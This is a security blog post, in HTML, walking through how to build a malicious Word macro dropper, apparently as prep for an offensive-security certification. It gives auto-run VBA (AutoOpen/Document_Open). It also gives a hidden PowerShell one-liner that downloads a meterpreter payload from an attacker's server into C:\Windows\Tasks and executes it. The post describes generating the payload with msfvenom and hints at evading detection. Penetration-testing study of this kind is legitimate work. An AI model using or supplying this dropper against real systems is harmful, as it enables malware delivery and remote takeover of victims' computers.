<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Dropper Using VBA | Shelldon's blog</title>
<meta name=keywords content="VBA,Social Engineering,OSEP"><meta name=description content="In this post we will talk about how to create a dropper using VBA and some detection stuff.
First off, what is VBA and why it is useful.
Well VBA stands for Visual Basic for Applications. This language very useful for creation some macros for the Microsoft Office tools. It has very interesting syntax and datatypes.
To start coding in VBA we need to create a document, which can support macros."><meta name=author content="Shelldon"><link rel=canonical href=http://localhost:1313/posts/dropper-using-vba/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.1fa9b2f9d71288e3adc6e7337b3abeb5b9b1b58000345713ddb67551813bde0f.css integrity="sha256-H6my+dcSiOOtxuczezq+tbmxtYAANFcT3bZ1UYE73g8=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/dropper-using-vba/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Dropper Using VBA"><meta property="og:description" content="In this post we will talk about how to create a dropper using VBA and some detection stuff.
First off, what is VBA and why it is useful.
Well VBA stands for Visual Basic for Applications. This language very useful for creation some macros for the Microsoft Office tools. It has very interesting syntax and datatypes.
To start coding in VBA we need to create a document, which can support macros."><meta property="og:type" content="article"><meta property="og:url" content="http://localhost:1313/posts/dropper-using-vba/"><meta property="og:image" content="http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-08-23T18:44:32+05:00"><meta property="article:modified_time" content="2024-08-23T18:44:32+05:00"><meta property="og:site_name" content="Shelldon's blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Dropper Using VBA"><meta name=twitter:description content="In this post we will talk about how to create a dropper using VBA and some detection stuff.
First off, what is VBA and why it is useful.
Well VBA stands for Visual Basic for Applications. This language very useful for creation some macros for the Microsoft Office tools. It has very interesting syntax and datatypes.
To start coding in VBA we need to create a document, which can support macros."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://localhost:1313/posts/"},{"@type":"ListItem","position":2,"name":"Dropper Using VBA","item":"http://localhost:1313/posts/dropper-using-vba/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Dropper Using VBA","name":"Dropper Using VBA","description":"In this post we will talk about how to create a dropper using VBA and some detection stuff.\nFirst off, what is VBA and why it is useful.\nWell VBA stands for Visual Basic for Applications. This language very useful for creation some macros for the Microsoft Office tools. It has very interesting syntax and datatypes.\nTo start coding in VBA we need to create a document, which can support macros.","keywords":["VBA","Social Engineering","OSEP"],"articleBody":"In this post we will talk about how to create a dropper using VBA and some detection stuff.\nFirst off, what is VBA and why it is useful.\nWell VBA stands for Visual Basic for Applications. This language very useful for creation some macros for the Microsoft Office tools. It has very interesting syntax and datatypes.\nTo start coding in VBA we need to create a document, which can support macros. We can not use document types, which contain ‘x’. The best options are .doc (doc 97-2003 years) or .docm whic support macros\nYou may open Word and create a blank document or create a document in whatever format then just save in two types above written. Then go to View -\u003e Macros -\u003e View Macros. Here we need to choose “Macros in” the name of the document or current document. In my case it is temp.docx (document)\nThen write the name of the Macro. We can use just MyMacro and we have the VBA Editor.\nNow let’s talk abut what is Sub and how it works.\nA sub can be described as a small program within the VBA Editor that performs a specific action in Excel. It is used to break large pieces of code into smaller parts that can be easily managed. VBA Sub is very similar to function type, but in it is not function. The difference between a Sub and Function are follows:\nSub\nA sub performs a task but does not return a value like void type; Subs can be recaalled from anywhere in the program and in multiple types; Subs cannot be used directly in spreadsheets as formulas; Users must insert a value in the desired call before getting the result of the sub; Excel users can execute a VBA sub. Function\nA function returns a value of the tasks performed. Functions are called by a variable. Functions are used directly in spreadsheets as formulas. Functions can be used to perform repetitive tasks and return a value. Excel users cannot execute VBA functions. After understanding what is sub we can start coding :) To automatically run the script we can use Subs AutoOpen and Document_Open.\nThe idea of the dropper is download a malicious file from the hacker’s server and execute it in the victim’s system. We can use WScript and its method Exec to execute cmd or powershell command.\nAbout Wscript\nWindows Script Host provides an environment in which users can execute scripts in various languages that use various object models to perform tasks.\nWe need to use the Set keyword to set a WScript.Shell object, then using that object calling Exec method to execute a command.\nSub MyMacro() Set shell_object = CreateObject(\"WScript.Shell\") shell_object.Exec (\"calc.exe\") End Sub Sub AutoOpen() MyMacro End Sub Sub Document_Open() MyMacro End Sub But before we need to save the macro using short key Ctrl + S. If you used not .docm or .doc file format, you will have this alert message.\nWe need to click No and choose the type, which support macros. In my case it will be .doc file.\nAfter that close the document and reopen the .doc version. After opening the document you will see the alert about Macro.\nClick to Enable Content and wait execution of the macro.\nAs you can see the macro successfully executed and called calc.exe\nThat is good, but what about downloading and executing files from the hacker’s server. So we can use powershell, System.WebClient object and its DownloadFile method to download and save the file. Then Start-Process command to start the process.\nPowershell code, to download and save the met.exe file.\npowershell.exe -window-style hidden (New-Object System.Net.WebClient).DownloadFile('http://192.168.0.83/met.exe', 'C:\\Windows\\Tasks\\met.exe') Then using Start-Process we can execute the met.exe:\nStart-Process C:\\Windows\\Tasks\\met.exe Combine them together:\npowershell.exe -window-style hidden (New-Object System.Net.WebClient).DownloadFile('http://192.168.0.83/met.exe', 'C:\\Windows\\Tasks\\met.exe'); Start-Process C:\\Windows\\Tasks\\met.exe Before saving and opening the document create a malicious file using msfvenom or whatever framework/c2. In my case it is just meterpreter cmd spawner.\nThen open python http server. Also before generating a malicious file understand in which process arch the word running, It maybe x32 or x64. In my case it is x64 process.\nAfter opening document we can see that from victim get request to download met.exe file.\nIn the Victim’s machine spawned cmd.exe (btw my defender is not turned on, so that’s why cmd spawned XD).\nThat kind of attack is detectable, but using some custom encryption and using C2 shellcodes might work.\nIn the next part we will create VBA code, which will use Win32 APIs.\n","wordCount":"749","inLanguage":"en","image":"http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2024-08-23T18:44:32+05:00","dateModified":"2024-08-23T18:44:32+05:00","author":{"@type":"Person","name":"Shelldon"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/posts/dropper-using-vba/"},"publisher":{"@type":"Organization","name":"Shelldon's blog","logo":{"@type":"ImageObject","url":"http://localhost:1313/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Home (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/categories/ title=categories><span>categories</span></a></li><li><a href=http://localhost:1313/tags/ title=tags><span>tags</span></a></li><li><a href=http://localhost:1313/posts/ title=blog><span>blog</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">Dropper Using VBA</h1><div class=post-meta><span title='2024-08-23 18:44:32 +0500 +05'>August 23, 2024</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;749 words&nbsp;·&nbsp;Shelldon</div></header><div class=post-content><p>In this post we will talk about how to create a dropper using VBA and some detection stuff.</p><p>First off, what is VBA and why it is useful.<br>Well VBA stands for Visual Basic for Applications. This language very useful for creation some macros for the Microsoft Office tools. It has very interesting syntax and datatypes.</p><p>To start coding in VBA we need to create a document, which can support macros. We can not use document types, which contain &lsquo;x&rsquo;. The best options are .doc (doc 97-2003 years) or .docm whic support macros</p><p>You may open Word and create a blank document or create a document in whatever format then just save in two types above written. Then go to View -> Macros -> View Macros.
Here we need to choose &ldquo;Macros in&rdquo; the name of the document or current document. In my case it is temp.docx (document)</p><p><img loading=lazy src=image.png alt="Alt text"></p><p><br>Then write the name of the Macro. We can use just MyMacro and we have the VBA Editor.</p><p><img loading=lazy src=image-1.png alt="Alt text"></p><p><br>Now let&rsquo;s talk abut what is Sub and how it works.</p><p>A sub can be described as a small program within the VBA Editor that performs a specific action in Excel. It is used to break large pieces of code into smaller parts that can be easily managed.
VBA Sub is very similar to function type, but in it is not function.
The difference between a Sub and Function are follows:</p><blockquote><p><strong>Sub</strong></p></blockquote><ul><li>A sub performs a task but does not return a value like void type;</li><li>Subs can be recaalled from anywhere in the program and in multiple types;</li><li>Subs cannot be used directly in spreadsheets as formulas;</li><li>Users must insert a value in the desired call before getting the result of the sub;</li><li>Excel users can execute a VBA sub.</li></ul><blockquote><p><strong>Function</strong></p></blockquote><ul><li>A function returns a value of the tasks performed.</li><li>Functions are called by a variable.</li><li>Functions are used directly in spreadsheets as formulas.</li><li>Functions can be used to perform repetitive tasks and return a value.</li><li>Excel users cannot execute VBA functions.</li></ul><p><br>After understanding what is sub we can start coding :)
To automatically run the script we can use Subs AutoOpen and Document_Open.</p><p><img loading=lazy src=image-2.png alt="Alt text"></p><p><br>The idea of the dropper is download a malicious file from the hacker&rsquo;s server and execute it in the victim&rsquo;s system. We can use WScript and its method Exec to execute cmd or powershell command.</p><p><strong>About Wscript</strong></p><p>Windows Script Host provides an environment in which users can execute scripts in various languages that use various object models to perform tasks.</p><p>We need to use the Set keyword to set a WScript.Shell object, then using that object calling Exec method to execute a command.</p><p><img loading=lazy src=image-3.png alt="Alt text"></p><pre tabindex=0><code class=language-vba data-lang=vba>Sub MyMacro()
    Set shell_object = CreateObject(&#34;WScript.Shell&#34;)
    shell_object.Exec (&#34;calc.exe&#34;)
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub
</code></pre><p><br>But before we need to save the macro using short key Ctrl + S. If you used not .docm or .doc file format, you will have this alert message.</p><p><img loading=lazy src=image-4.png alt="Alt text"><br>We need to click No and choose the type, which support macros. In my case it will be .doc file.</p><p><img loading=lazy src=image-5.png alt="Alt text"><br>After that close the document and reopen the .doc version. After opening the document you will see the alert about Macro.</p><p><img loading=lazy src=image-6.png alt="Alt text"><br>Click to Enable Content and wait execution of the macro.</p><p><img loading=lazy src=image-7.png alt="Alt text"><br>As you can see the macro successfully executed and called calc.exe</p><p>That is good, but what about downloading and executing files from the hacker&rsquo;s server. So we can use powershell, System.WebClient object and its DownloadFile method to download and save the file. Then Start-Process command to start the process.</p><p>Powershell code, to download and save the met.exe file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>powershell</span><span class=p>.</span><span class=py>exe</span> <span class=n>-window-style</span> <span class=n>hidden</span> <span class=p>(</span><span class=nb>New-Object</span> <span class=n>System</span><span class=p>.</span><span class=py>Net</span><span class=p>.</span><span class=n>WebClient</span><span class=p>).</span><span class=py>DownloadFile</span><span class=p>(</span><span class=s1>&#39;http://192.168.0.83/met.exe&#39;</span><span class=p>,</span> <span class=s1>&#39;C:\Windows\Tasks\met.exe&#39;</span><span class=p>)</span>
</span></span></code></pre></div><p><br>Then using Start-Process we can execute the met.exe:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Start-Process</span> <span class=n>C:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>Tasks</span><span class=p>\</span><span class=n>met</span><span class=p>.</span><span class=py>exe</span>
</span></span></code></pre></div><p><br>Combine them together:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>powershell</span><span class=p>.</span><span class=py>exe</span> <span class=n>-window-style</span> <span class=n>hidden</span> <span class=p>(</span><span class=nb>New-Object</span> <span class=n>System</span><span class=p>.</span><span class=py>Net</span><span class=p>.</span><span class=n>WebClient</span><span class=p>).</span><span class=py>DownloadFile</span><span class=p>(</span><span class=s1>&#39;http://192.168.0.83/met.exe&#39;</span><span class=p>,</span> <span class=s1>&#39;C:\Windows\Tasks\met.exe&#39;</span><span class=p>);</span> <span class=nb>Start-Process</span> <span class=n>C:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>Tasks</span><span class=p>\</span><span class=n>met</span><span class=p>.</span><span class=py>exe</span>
</span></span></code></pre></div><p><br>Before saving and opening the document create a malicious file using msfvenom or whatever framework/c2. In my case it is just meterpreter cmd spawner.</p><p><img loading=lazy src=image-9.png alt="Alt text"><br>Then open python http server.
Also before generating a malicious file understand in which process arch the word running, It maybe x32 or x64. In my case it is x64 process.</p><p><img loading=lazy src=image-8.png alt="Alt text"><br>After opening document we can see that from victim get request to download met.exe file.</p><p><img loading=lazy src=image-10.png alt="Alt text"><br>In the Victim&rsquo;s machine spawned cmd.exe (btw my defender is not turned on, so that&rsquo;s why cmd spawned XD).</p><p><img loading=lazy src=image-11.png alt="Alt text"><br>That kind of attack is detectable, but using some custom encryption and using C2 shellcodes might work.</p><p>In the next part we will create VBA code, which will use Win32 APIs.</p></div><footer class=post-footer><ul class=post-tags><li><a href=http://localhost:1313/tags/vba/>VBA</a></li><li><a href=http://localhost:1313/tags/social-engineering/>Social Engineering</a></li><li><a href=http://localhost:1313/tags/osep/>OSEP</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2024 <a href=http://localhost:1313/>Shelldon's blog</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>